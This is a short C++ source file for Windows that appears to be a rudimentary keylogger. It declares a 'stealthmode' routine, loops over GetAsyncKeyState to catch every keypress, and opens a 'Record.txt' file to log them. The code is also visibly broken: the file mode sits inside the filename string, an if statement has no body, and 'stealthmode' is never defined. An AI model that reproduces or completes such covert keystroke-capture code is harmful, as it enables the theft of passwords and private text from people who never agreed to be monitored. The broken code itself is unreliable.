#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void stealthmode();
void startlogging();

int main()
{
    stealthmode();
    startlogging();

    return 0;
}

void startlogging()
{
    char c;
    for(;;)
    {
        for(c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {
                ofstream write("Record.txt, ios::app");
                if(((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10))  )
            }
        }
    }
}